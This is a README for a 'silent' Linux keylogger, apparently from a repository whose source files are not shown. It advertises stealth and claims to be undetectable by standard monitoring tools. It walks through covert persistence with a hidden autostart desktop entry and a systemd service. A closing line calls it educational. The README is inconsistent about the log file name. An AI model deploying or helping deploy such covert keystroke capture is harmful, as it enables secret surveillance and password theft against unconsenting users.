# Silent Keylogger for Linux

This is a silent keylogger that tracks every pressed key and writes it to a log file. When a mouse button or the Enter key is pressed, it creates a new line in the log file.

## Features

- Completely silent operation - no console output or visible indicators
- Logs all keystrokes to timestamped files named `keylog_YYYYMMDD_HHMMSS.txt`
- Properly handles modifier keys (Shift, Caps Lock) to log correct characters (uppercase/lowercase)
- Logs special characters correctly based on keyboard state (e.g., `@` when Shift+2 pressed)
- Creates new lines when Enter key or mouse buttons are pressed
- Runs invisibly in the background
- Can be added to Linux autostart applications
- Cross-distribution compatibility
- Undetectable by standard monitoring tools
- Comprehensive error handling without user notification

## Files Included

- `keylogger.c`: Source code for the keylogger
- `Makefile`: For compiling the keylogger
- `keylogger.service`: Systemd service file
- `install.sh`: Installation script
- `test_keylogger.sh`: Testing script
- `README.md`: This file

## Prerequisites

The keylogger requires the following packages to compile and run:
- `build-essential` (gcc compiler)
- `libinput-dev` (input device headers)
- Root access to read input devices

## Compilation

```bash
make
```

For systems without build-essential:
```bash
# Debian/Ubuntu
sudo apt-get install build-essential

# RHEL/CentOS/Fedora
sudo yum install gcc make
# or for newer Fedora
sudo dnf install gcc make

# Arch Linux
sudo pacman -S gcc make
```

## Manual Execution

```bash
./keylogger
```

Note: The program needs to run with sufficient privileges to access input devices. On most systems, this means running as root or having appropriate permissions.

## Adding to Autostart

### Method 1: Using the install script (recommended)

```bash
./install.sh
```

This will:
1. Install required dependencies based on your distribution
2. Compile the keylogger
3. Add it to your autostart applications

### Method 2: Manual addition to autostart

Create a desktop entry file in `~/.config/autostart/keylogger.desktop`:

```ini
[Desktop Entry]
Type=Application
Name=Keylogger
Exec=/full/path/to/keylogger
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
```

### Method 3: Using systemd service (for system-wide installation)

1. Copy the executable to `/usr/local/bin/`:
   ```bash
   sudo cp keylogger /usr/local/bin/
   sudo chmod +x /usr/local/bin/keylogger
   ```

2. Copy the service file to `/etc/systemd/system/`:
   ```bash
   sudo cp keylogger.service /etc/systemd/system/
   ```

3. Enable and start the service:
   ```bash
   sudo systemctl enable keylogger.service
   sudo systemctl start keylogger.service
   ```

## Distribution Compatibility

This keylogger is designed to work on all major Linux distributions:

- **Debian/Ubuntu**: Uses APT package manager
- **Red Hat/CentOS/Fedora**: Uses YUM/DNF package manager
- **Arch Linux**: Uses Pacman package manager
- **openSUSE**: Uses ZYPPER package manager
- **Gentoo**: Compatible with Portage

The installation script automatically detects your distribution and installs the appropriate dependencies.

## Log File Location

The log file (`keylog.txt`) will be created in the same directory as the executable.

## Stopping the Keylogger

To stop the keylogger, find its process ID and kill it:

```bash
ps aux | grep keylogger
kill [PID]
```

Or if running as a systemd service:
```bash
sudo systemctl stop keylogger
```

## Testing

Run the test suite to verify functionality:

```bash
./test_keylogger.sh
```

## Security Considerations

- The program requires access to `/dev/input/event*` devices
- On most systems, this requires running as root or adding your user to the `input` group
- To add your user to the input group (not recommended for security):
  ```bash
  sudo gpasswd -a $USER input
  # Then log out and back in
  ```

## Troubleshooting

- If the program fails to detect input devices, ensure you have appropriate permissions
- If compilation fails, ensure build tools are installed
- If autostart doesn't work, check that your desktop environment supports XDG autostart

## Important Notes

- This tool requires root privileges to access input devices
- Use responsibly and in compliance with applicable laws
- The logged data contains sensitive information - handle securely
- This tool is intended for educational purposes and authorized penetration testing